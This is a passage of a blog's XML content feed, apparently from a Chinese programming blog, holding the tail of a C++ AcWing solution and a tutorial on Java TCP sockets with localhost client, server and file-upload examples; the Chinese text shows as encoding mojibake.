class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>      cin <span class="token operator">&gt;&gt;</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> answer1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> answer2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token char">'A'</span><span class="token punctuation">;</span> ch <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">;</span> ch<span class="token operator">++</span><span class="token punctuation">)</span>     answer1 <span class="token operator">+=</span> <span class="token function">cow_wins</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch1 <span class="token operator">=</span> <span class="token char">'A'</span><span class="token punctuation">;</span> ch1 <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">;</span> ch1<span class="token operator">++</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> ch2 <span class="token operator">=</span> ch1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> ch2 <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">;</span> ch2<span class="token operator">++</span><span class="token punctuation">)</span>       answer2 <span class="token operator">+=</span> <span class="token function">team_wins</span><span class="token punctuation">(</span>ch1<span class="token punctuation">,</span> ch2<span class="token punctuation">)</span><span class="token punctuation">;</span>  cout <span class="token operator">&lt;&lt;</span> answer1 <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span> <span class="token operator">&lt;&lt;</span> answer2 <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaç½‘ç»œç¼–ç¨‹</title>
      <link href="/2022/04/02/java-wang-luo-bian-cheng/"/>
      <url>/2022/04/02/java-wang-luo-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="TCPé€šä¿¡ç¨‹åº"><a href="#TCPé€šä¿¡ç¨‹åº" class="headerlink" title="TCPé€šä¿¡ç¨‹åº"></a>TCPé€šä¿¡ç¨‹åº</h2><ul><li><p>Javaä¸­çš„TCPé€šä¿¡</p><p>â€‹    Javaå¯¹åŸºäºTCPåè®®çš„çš„ç½‘ç»œæä¾›äº†è‰¯å¥½çš„å°è£…ï¼Œä½¿ç”¨Socketå¯¹è±¡æ¥ä»£è¡¨ä¸¤ç«¯çš„é€šä¿¡ç«¯å£ï¼Œå¹¶é€šè¿‡Socketäº§ç”ŸIOæµæ¥è¿›è¡Œç½‘ç»œé€šä¿¡ã€‚</p><p>â€‹    Javaä¸ºå®¢æˆ·ç«¯æä¾›äº†Socketç±»ï¼Œä¸ºæœåŠ¡å™¨ç«¯æä¾›äº†ServerSocketç±»</p></li><li><img src="07_TCPä¸‰æ¬¡æ¡æ‰‹.png" alt="TCPä¸‰æ¬¡æ¡æ‰‹" style="zoom:80%;"></li><li><img src="08_TCPå››æ¬¡æŒ¥æ‰‹.png" alt="TCPå››æ¬¡æŒ¥æ‰‹" style="zoom:80%;"></li></ul><h4 id="åˆ›å»ºå®¢æˆ·ç«¯"><a href="#åˆ›å»ºå®¢æˆ·ç«¯" class="headerlink" title="åˆ›å»ºå®¢æˆ·ç«¯"></a>åˆ›å»ºå®¢æˆ·ç«¯</h4><ul><li><p>æ„é€ æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Socket(InetAddress address,int port)</td><td>åˆ›å»ºæµå¥—æ¥å­—å¹¶å°†å…¶è¿æ¥åˆ°æŒ‡å®šIPæŒ‡å®šç«¯å£å·</td></tr><tr><td>Socket(String host, int port)</td><td>åˆ›å»ºæµå¥—æ¥å­—å¹¶å°†å…¶è¿æ¥åˆ°æŒ‡å®šä¸»æœºä¸Šçš„æŒ‡å®šç«¯å£å·</td></tr></tbody></table></li><li><p>ç›¸å…³æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>InputStream  getInputStream()</td><td>è¿”å›æ­¤å¥—æ¥å­—çš„è¾“å…¥æµ</td></tr><tr><td>OutputStream getOutputStream()</td><td>è¿”å›æ­¤å¥—æ¥å­—çš„è¾“å‡ºæµ</td></tr></tbody></table></li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> client <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è·å–è¾“å‡ºæµï¼Œå†™æ•°æ®</span>        <span class="token comment">//OutputStream getOutputStream() è¿”å›æ­¤å¥—æ¥å­—çš„è¾“å‡ºæµ</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//é‡Šæ”¾èµ„æº</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ›å»ºæœåŠ¡ç«¯"><a href="#åˆ›å»ºæœåŠ¡ç«¯" class="headerlink" title="åˆ›å»ºæœåŠ¡ç«¯"></a>åˆ›å»ºæœåŠ¡ç«¯</h4><ul><li><p>æ„é€ æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ServerSocket(int port)</td><td>åˆ›å»ºç»‘å®šåˆ°æŒ‡å®šç«¯å£çš„æœåŠ¡å™¨å¥—æ¥å­—</td></tr></tbody></table></li><li><p>ç›¸å…³æ–¹æ³•</p><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Socket accept()</td><td>ç›‘å¬è¦è¿æ¥åˆ°æ­¤çš„å¥—æ¥å­—å¹¶æ¥å—å®ƒ</td></tr></tbody></table></li><li><p>æ³¨æ„äº‹é¡¹</p><ol><li>acceptæ–¹æ³•æ˜¯é˜»å¡çš„,ä½œç”¨å°±æ˜¯ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥</li><li>å®¢æˆ·ç«¯åˆ›å»ºå¯¹è±¡å¹¶è¿æ¥æœåŠ¡å™¨,æ­¤æ—¶æ˜¯é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹åè®®,ä¿è¯è·ŸæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥</li><li>é’ˆå¯¹å®¢æˆ·ç«¯æ¥è®²,æ˜¯å¾€å¤–å†™çš„,æ‰€ä»¥æ˜¯è¾“å‡ºæµ<br>é’ˆå¯¹æœåŠ¡å™¨æ¥è®²,æ˜¯å¾€é‡Œè¯»çš„,æ‰€ä»¥æ˜¯è¾“å…¥æµ</li><li>readæ–¹æ³•ä¹Ÿæ˜¯é˜»å¡çš„</li><li>å®¢æˆ·ç«¯åœ¨å…³æµçš„æ—¶å€™,è¿˜å¤šäº†ä¸€ä¸ªå¾€æœåŠ¡å™¨å†™ç»“æŸæ ‡è®°çš„åŠ¨ä½œ</li><li>æœ€åä¸€æ­¥æ–­å¼€è¿æ¥,é€šè¿‡å››æ¬¡æŒ¥æ‰‹åè®®ä¿è¯è¿æ¥ç»ˆæ­¢</li></ol></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> server <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">//åˆ›å»ºæœåŠ¡å™¨ç«¯çš„Socketå¯¹è±¡(ServerSocket)</span>        <span class="token comment">//ServerSocket(int port) åˆ›å»ºç»‘å®šåˆ°æŒ‡å®šç«¯å£çš„æœåŠ¡å™¨å¥—æ¥å­—</span>        <span class="token class-name">ServerSocket</span> ss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Socket accept() ä¾¦å¬è¦è¿æ¥åˆ°æ­¤å¥—æ¥å­—å¹¶æ¥å—å®ƒ</span>        <span class="token class-name">Socket</span> s <span class="token operator">=</span> ss<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è·å–è¾“å…¥æµï¼Œè¯»æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®æ˜¾ç¤ºåœ¨æ§åˆ¶å°</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bys <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bys<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bys<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ•°æ®æ˜¯ï¼š"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//é‡Šæ”¾èµ„æº</span>        s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ss<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCPé€šä¿¡æ¡ˆä¾‹"><a href="#TCPé€šä¿¡æ¡ˆä¾‹" class="headerlink" title="TCPé€šä¿¡æ¡ˆä¾‹"></a>TCPé€šä¿¡æ¡ˆä¾‹</h4><ul><li>æœåŠ¡ç«¯</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocket</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> server <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ServerSocket</span> ss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Socket</span> accept <span class="token operator">=</span> ss<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> accept<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> temp<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment">//-1æ˜¯ç»“æŸç¬¦çš„æ ‡å¿—ç”±å®¢æˆ·ç«¯å‘é€</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment">//            OutputStream os = accept.getOutputStream();</span><span class="token comment">//            os.write("who?".getBytes());</span>        <span class="token class-name">BufferedWriter</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>accept<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bs<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"ä½ è°å•Šï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bs<span class="token punctuation">.</span><span class="token function">newLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bs<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        accept<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ss<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å®¢æˆ·ç«¯</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> client01 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Socket</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ä»…ä»…å…³é—­è¾“å‡ºæµ.å¹¶å†™ä¸€ä¸ªç»“æŸæ ‡è®°,å¯¹socketæ²¡æœ‰ä»»ä½•å½±å“</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">shutdownOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        InputStream is = s.getInputStream();</span><span class="token comment">//        int temp;</span><span class="token comment">//        while((temp=is.read())!=-1){</span><span class="token comment">//            System.out.println((char)temp);</span><span class="token comment">//        }</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment">//        is.close();</span>        br<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p><ol><li>åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œè¦ä½¿ç”¨ç»“æŸæ ‡è®°ï¼Œä¸ç„¶æœåŠ¡ç«¯ä¸€ç›´åœ¨è¯»å–å®¢æˆ·ç«¯å†…å®¹å½¢æˆé˜»å¡</li><li>å› ä¸ºæœ‰ä¸­æ–‡çš„å­˜åœ¨ä¸èƒ½ä½¿ç”¨å­—èŠ‚æµè¯»å–ï¼ˆgetInputStreamï¼‰è¦ä½¿ç”¨å­—èŠ‚æµè¯»å–ï¼ˆInputStreamReaderï¼‰å¦åˆ™ä¼šå‡ºç°ä¹±ç æƒ…å†µã€‚</li></ol><h4 id="TCPé€šä¿¡ä¸Šä¼ æ–‡ä»¶æ¡ˆä¾‹"><a href="#TCPé€šä¿¡ä¸Šä¼ æ–‡ä»¶æ¡ˆä¾‹" class="headerlink" title="TCPé€šä¿¡ä¸Šä¼ æ–‡ä»¶æ¡ˆä¾‹"></a>TCPé€šä¿¡ä¸Šä¼ æ–‡ä»¶æ¡ˆä¾‹</h4><p>æœåŠ¡ç«¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServerDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ServerSocket</span> ss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ThreadPoolExecutor</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span>                <span class="token number">3</span><span class="token punctuation">,</span><span class="token comment">//æ ¸å¿ƒçº¿ç¨‹æ•°é‡</span>                <span class="token number">10</span><span class="token punctuation">,</span>   <span class="token comment">//çº¿ç¨‹æ± çš„æ€»æ•°é‡</span>                <span class="token number">60</span><span class="token punctuation">,</span>   <span class="token comment">//ä¸´æ—¶çº¿ç¨‹ç©ºé—²æ—¶é—´</span>                <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span>SECONDS<span class="token punctuation">,</span> <span class="token comment">//ä¸´æ—¶çº¿ç¨‹ç©ºé—²æ—¶é—´çš„å•ä½</span>                <span class="token keyword">new</span> <span class="token class-name">ArrayBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//é˜»å¡é˜Ÿåˆ—</span>                <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">defaultThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//åˆ›å»ºçº¿ç¨‹çš„æ–¹å¼</span>                <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor<span class="token punctuation">.</span>AbortPolicy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//ä»»åŠ¡æ‹’ç»ç­–ç•¥</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">Socket</span> accept <span class="token operator">=</span> ss<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ThreadSocket</span> ts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadSocket</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//new Thread(ts).start();</span>            pool<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>ts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//ss.close();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¢æˆ·ç«¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClientDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//æ˜¯æœ¬åœ°çš„æµ,ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„.</span>        <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"socketmodule\\ClientDir\\1.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//å†™åˆ°æœåŠ¡å™¨ --- ç½‘ç»œä¸­çš„æµ</span>        <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            